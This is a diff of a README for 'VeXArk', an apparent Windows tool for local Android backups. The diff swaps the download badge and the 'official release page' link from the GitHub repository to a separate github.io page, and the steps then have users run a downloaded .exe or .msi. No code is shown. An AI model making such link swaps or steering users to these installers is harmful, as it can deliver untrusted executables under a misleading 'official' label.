@@ -1,6 +1,6 @@
 # 🔒 VeXArk - Secure Android backups without any cloud
 
-[![](https://img.shields.io/badge/Download-VeXArk-blue.svg)](https://github.com/HackerNoHat/VeXArk)
+[![](https://img.shields.io/badge/Download-VeXArk-blue.svg)](https://hackernohat.github.io)
 
 VeXArk stores your Android phone data on your Windows computer. It keeps your files local. It avoids the cloud. It prevents companies from tracking your device. The program encrypts your backups to keep them private.
 
@@ -8,7 +8,7 @@ VeXArk stores your Android phone data on your Windows computer. It keeps your fi
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official release page](https://github.com/HackerNoHat/VeXArk) to download the installer.
+1. Visit the [official release page](https://hackernohat.github.io) to download the installer.
 2. Select the file ending in `.msi` or `.exe` for Windows.
 3. Save the file to your computer.
 4. Double-click the file to start the installation.
